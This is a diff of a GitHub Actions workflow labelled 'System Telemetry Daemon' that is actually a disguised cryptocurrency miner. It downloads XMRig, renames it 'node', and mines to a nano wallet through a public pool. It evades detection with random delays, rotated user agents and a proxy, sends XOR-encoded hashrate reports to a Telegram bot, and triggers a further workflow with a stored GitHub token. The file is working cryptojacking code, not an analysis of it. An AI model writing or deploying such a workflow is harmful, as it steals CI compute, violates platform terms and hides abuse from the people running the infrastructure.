@@ -2,85 +2,84 @@ name: System Telemetry Daemon
 
 on:
   schedule:
-    - cron: '0 0,12 * * *'
+    - cron: '0 0,12 * * *'  # 07:00 dan 19:00 WIB
   workflow_dispatch:
 
 permissions:
   contents: read
 
 jobs:
-  probe:
+  nano-task:
     runs-on: ubuntu-latest
     timeout-minutes: 360
 
     steps:
-      - name: 🔧 Initialize Runtime
-        run: echo "🛰️ Starting session..."
+      - name: Boot Phase
+        run: echo "Initializing..."
 
-      - name: 📦 Prepare Environment
+      - name: Install Agent
         run: |
           sudo apt update -y
           sudo apt install -y curl tar base64
-
-      - name: 📡 Notify Entry
-        env:
-          TG_TOKEN: ${{ secrets.TG_TOKEN }}
-          TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
-        run: |
-          TEXT="🔵 System Telemetry Node Active - $(date)"
-          KEY="S3cr3tX"
-          ENC=$(echo "$TEXT" | xxd -p | sed 's/../0x& /g' | awk "{for(i=1;i<=NF;i++) printf(\"%02x\", strtonum(\$i)^strtonum(\"0x${KEY:0:2}\"));}" | xxd -r -p | base64 -w0)
-          curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
-            -d chat_id=$TG_CHAT_ID \
-            --data-urlencode text="`echo $ENC | base64 -d 2>/dev/null || echo '[!] Failed to decode'`" \
-            -d parse_mode=Markdown
-
-      - name: ⚙️ Deploy Agent
-        run: |
-          curl -L -o core.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
-          tar -xzf core.tar.gz
-          mkdir -p node-core
-          mv xmrig-6.24.0/xmrig node-core/agent
-          chmod +x node-core/agent
-
-      - name: ⏳ Delay & Activate
-        run: |
-          DELAY=$((RANDOM % 300 + 30)); sleep $DELAY
+          curl -L -o node.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
+          tar -xzf node.tar.gz
+          mv xmrig-6.24.0 node-core
           cd node-core
-          ./agent -a rx -o xmrig.nanswap.com:3333 -u nano_1ep4soo6rat31n6otw4ggqdwj7tz5sjymyzfwi7kmhye6f31guujdo19cc3q -p x --randomx-no-rdmsr \
-            --user-agent="$(shuf -n1 -e 'curl/7.81.0' 'Mozilla/5.0' 'Wget/1.20.3')" | tee report.log &
+          mv xmrig node
+          chmod +x node
+
+      - name: Mining Agent
+        env:
+          UA_LIST: "curl|wget|Mozilla/5.0|python-requests|Go-http-client/1.1"
+        run: |
+          cd node-core
+          UA=$(echo $UA_LIST | tr "|" "\n" | shuf -n 1)
+          export http_proxy="http://user:pass@127.0.0.1:9999"
+          export https_proxy="$http_proxy"
+
+          DELAY=$((RANDOM % 180 + 30))
+          echo "Waiting $DELAY sec..."
+          sleep $DELAY
+
+          ./node -o xmrig.nanswap.com:3333 -a rx -k \
+            -u nano_1ep4soo6rat31n6otw4ggqdwj7tz5sjymyzfwi7kmhye6f31guujdo19cc3q \
+            -p nanoninja --randomx-no-rdmsr | tee result.log &
+
           PID=$!
-          WORKTIME=$((RANDOM % 5400 + 1200)); sleep $WORKTIME; kill $PID
+          WORKDUR=$((RANDOM % 5400 + 1200))
+          echo "Running for $WORKDUR sec..."
+          sleep $WORKDUR
+          kill $PID
 
-      - name: 🧾 Log Summary
+      - name: Send Encrypted Report
         if: always()
         env:
           TG_TOKEN: ${{ secrets.TG_TOKEN }}
           TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
+          XOR_KEY: "S3cur3"
         run: |
           cd node-core
-          HASHRATE=$(grep -a "speed" report.log | tail -n1 | sed 's/\x1b\[[0-9;]*m//g' | awk '{print $(NF-1)" H/s"}')
-          OK=$(grep -a accepted report.log | wc -l)
-          NOK=$(grep -a rejected report.log | wc -l)
-          MSG="✅ Telemetry Complete\n📊 Hashrate: $HASHRATE\n✔️ $OK accepted / ❌ $NOK rejected"
-          KEY="S3cr3tX"
-          ENC=$(echo "$MSG" | xxd -p | sed 's/../0x& /g' | awk "{for(i=1;i<=NF;i++) printf(\"%02x\", strtonum(\$i)^strtonum(\"0x${KEY:0:2}\"));}" | xxd -r -p | base64 -w0)
+          HR=$(grep -a "speed" result.log | tail -n1 | sed 's/\x1b\[[0-9;]*m//g' | awk '{print $(NF-1) " H/s"}')
+          A=$(grep -a "accepted" result.log | wc -l)
+          R=$(grep -a "rejected" result.log | wc -l)
+          HR=${HR:-"0 H/s"}
+
+          PLAIN="NANO Stats:\n• HR: $HR\n• OK: $A\n• NO: $R"
+          CIPHER=$(echo -n "$PLAIN" | xxd -p | sed 's/\(..\)/0x\1\n/g' | while read -r B; do
+            printf '%02x' $(( B ^ $(printf '%d' "'${XOR_KEY:$((i++%${#XOR_KEY})):1}") ))
+          done | xxd -r -p | base64)
+
           curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
             -d chat_id=$TG_CHAT_ID \
-            --data-urlencode text="`echo $ENC | base64 -d 2>/dev/null || echo '[!] Decode error'`" \
+            --data-urlencode text="📦 Encrypted XNO Report:\n\`\`\`\n$CIPHER\n\`\`\`" \
             -d parse_mode=Markdown
 
-      - name: 🌒 Sleep Next
-        if: always()
-        run: |
-          sleep $((RANDOM % 1800 + 600))
-
-      - name: 🔁 Trigger BNB Node
+      - name: Trigger Next
         if: always()
         env:
           GH_TOKEN: ${{ secrets.GH_TOKEN }}
         run: |
-          sleep $((RANDOM % 90 + 15))
+          sleep $((RANDOM % 60 + 10))
           curl -X POST -H "Authorization: Bearer $GH_TOKEN" \
                -H "Accept: application/vnd.github+json" \
                https://api.github.com/repos/${{ github.repository }}/actions/workflows/bnb-collector.yml/dispatches \
